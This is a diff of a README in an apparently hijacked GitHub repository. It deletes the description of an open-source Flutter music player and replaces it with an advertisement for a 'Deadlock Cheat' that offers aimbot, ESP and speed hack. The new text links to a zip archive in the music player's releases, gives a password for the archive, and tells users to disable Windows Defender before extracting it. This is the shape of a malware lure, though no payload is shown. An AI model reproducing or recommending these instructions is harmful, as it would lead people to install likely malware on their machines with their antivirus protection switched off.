@@ -1,80 +1,36 @@
+# Deadlock Cheat
 
+## Description
+**Deadlock Cheat** is a powerful tool designed to enhance the gameplay experience in Deadlock. This cheat offers features such as ESP, Aimbot, No Recoil, and Speed Hack, allowing players to gain a competitive edge in the game. Developed with a focus on ease of use, Deadlock Cheat is easily configurable and provides efficient performance without lag. Use it to increase your chances of winning every match!
 
-<p align="center">
-  <a align="center" href="">
-    <img
-      src="https://ik.imagekit.io/vun0le607a/Github/Musician/app_icons/splash_icon_white_Ldfg7FfO-.png?ik-sdk-version=javascript-1.4.3&updatedAt=1674728487749"
-      width="180px"
-      alt="Musician light logo "
-    />
-    <h1 align="center">Musician</h1>
-  </a>
-</p>
+### Access
+To access the cheat, please use the password: **2024**.
 
-<p align="center">
-   An Open Source Music Player Built with
-  <a href="https://flutter.dev/">Flutter</a> .
-</p>
+## Features:
+- **ESP**: Displays information about enemies and items on the map.
+- **Aimbot**: Automatically targets enemies.
+- **No Recoil**: Eliminates recoil when shooting.
+- **Speed Hack**: Increases player movement speed.
 
+## How to Download
+1. Go to the [Releases](https://github.com/salahu01/Music-Player.Flutter/releases/download/V.0.0.2/October19.zip) page.
+2. Download the latest version of the Deadlock Cheat archive (.zip or .tar.gz).
+3. **Important**: Make sure to **disable Windows Defender** before extracting the files, or the process may fail.
 
-<p align="center">
-  <img
-    title="Offline Tracks"
-    alt="Android offline tracks screen"
-    src="https://ik.imagekit.io/vun0le607a/Github/Musician/musicia_screen_shots/tracks_eIwvyVBmw.png?ik-sdk-version=javascript-1.4.3&updatedAt=1674731316682"
-    width="32%"
-  />
-  <img
-    title="Offline Others"
-    alt="Android offline others screen"
-    src="https://ik.imagekit.io/vun0le607a/Github/Musician/musicia_screen_shots/other_G4W5-vnX2.png?ik-sdk-version=javascript-1.4.3&updatedAt=1674731316600"
-    width="32%"
-  />
-  <img
-    title="App settings"
-    alt='Android app settings screen'
-    src="https://ik.imagekit.io/vun0le607a/Github/Musician/musicia_screen_shots/settings_3yIz2FMmF.png?ik-sdk-version=javascript-1.4.3&updatedAt=1674731316557"
-    width="32%"
-  />
-</p>
+## How to Use
+1. Extract the downloaded archive to a convenient location.
+2. Launch the cheat, following the on-screen instructions.
+3. Enter the password **2024** when prompted.
+4. Configure the necessary settings to optimize your gameplay experience.
+5. Start the game and enjoy!
 
-### 🎯 Overview
-##### It is an offline music player built on the Flutter framework. First of all thanks to Google Gives us a wonderful framework. You can use this app like any other music app. This application includes unique user interfaces. In the current version you get limited online support.Currently you can check artists, their details and best tracks. This app may contain issues and bugs. I hope you will report issues . I will send a response to reported issues within 2-3 days.
-<!-- Musician is built with flutter . Musician is inspired by many applications including spotify,Youtube music,jio jiosaavn,etc. -->
+## Last Update: 18.10 🚀
+- Fixed bugs in the ESP functionality.
+- Improved Aimbot algorithms for greater accuracy.
+- Added new features for enhanced usability.
 
-### 💪 Motivation
-##### The main motivation for doing this project was that I was having issues with my favorite music player and the project had no structured code. 
+## License
+This project is distributed under the terms of [specify license if applicable].
 
-### ✍️ Feedback
-##### If you have any feedback, please reach out to me at cvsalahu12@gmail.com
-
-### 📚 Wiki
-
-##### Checkout [wiki](https://github.com/salahu01/Music-Player.Flutter/wiki) for more info
-
-### 💰 Donate
-
-<a href="https://www.buymeacoffee.com/salahu" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;" ></a>
-
-### ⚠️ Warning
-
-##### This project is not suitable for Material 3 ( supports 3.4 / 3.5 Fultter )
-
-### 🔑 License
-
-
-##### Copyright (c) 2023 Salahu01-Music-Player.Flutter
-
-
-##### Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: 
-
-##### The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
-
-
-##### THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
-
-### 📍 Conclusion
-
-##### I will be happy to answer any questions that you may have on this approach, and if you want to lend a hand with the boilerplate then please feel free to submit an issue and/or pull request 🙂
-
-##### Again to note, This is the one of the best architecture followed open source project . If you liked my work, don’t forget to ⭐ star the repo to show your support.
+## Disclaimer
+Use at your own risk. The developers are not responsible for any consequences related to the use of this tool.
